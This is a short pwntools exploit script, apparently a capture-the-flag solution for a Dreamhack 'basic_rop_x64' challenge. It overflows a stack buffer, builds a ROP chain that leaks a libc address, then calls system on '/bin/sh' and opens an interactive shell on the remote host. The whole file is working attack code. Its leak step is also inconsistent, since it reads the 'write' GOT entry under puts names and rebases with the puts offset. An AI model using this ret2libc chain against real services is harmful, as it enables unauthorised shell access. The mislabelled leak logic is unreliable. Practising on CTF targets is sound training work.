from pwn import *

context.log_level = 'debug'

#p = process(['./basic_rop_x64'], env={'LD_PRELOAD':'./libc.so.6'})
p = remote('host3.dreamhack.games', 13726)
le = ELF('./libc.so.6')
e = ELF('./basic_rop_x64')

popret = 0x400883 # pop rdi ; ret
puts_got = e.got['write']
puts_plt = e.plt['write']
main_addr = e.symbols['main']
puts_offset = le.symbols['puts']
system_offset = le.symbols['system']
binsh_offset = 0x18cd57

# Print <puts> addr & ret main
payload = 'A' * 0x48
payload += p64(popret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

p.sendline(payload)
p.recv(0x40)
puts_addr = p.recv(6)

print('[+] recv : \n', puts_addr)
libc_addr = u64(puts_addr + '\x00\x00') - puts_offset
system_addr = libc_addr + system_offset
binsh = libc_addr + binsh_offset
print('libc @ ' + hex(libc_addr))
print('system @ ' + hex(system_addr))
print('binsh @ ' + hex(binsh))

payload = 'A' * 0x48
payload += p64(popret)
payload += p64(binsh)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
